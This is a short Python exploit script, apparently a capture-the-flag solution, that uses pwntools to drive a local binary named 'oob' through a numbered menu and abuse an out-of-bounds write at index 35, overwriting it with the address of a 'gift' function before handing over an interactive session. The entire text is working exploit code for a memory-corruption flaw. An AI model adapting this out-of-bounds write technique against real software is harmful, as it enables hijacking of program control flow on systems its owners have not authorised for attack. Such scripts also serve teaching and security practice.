from pwn import *

e = ELF('./oob')

def read(idx):
    p.sendlineafter(b'3. echo\n', b'1')
    p.sendline(str(idx).encode())

def write(idx, value):
    p.sendlineafter(b'3. echo\n', b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(value).encode())

def echo(idx):
    p.sendlineafter(b'3. echo\n', b'3')
    p.sendline(str(idx).encode())

p = e.process()

write(35, e.sym['gift'])

p.interactive()
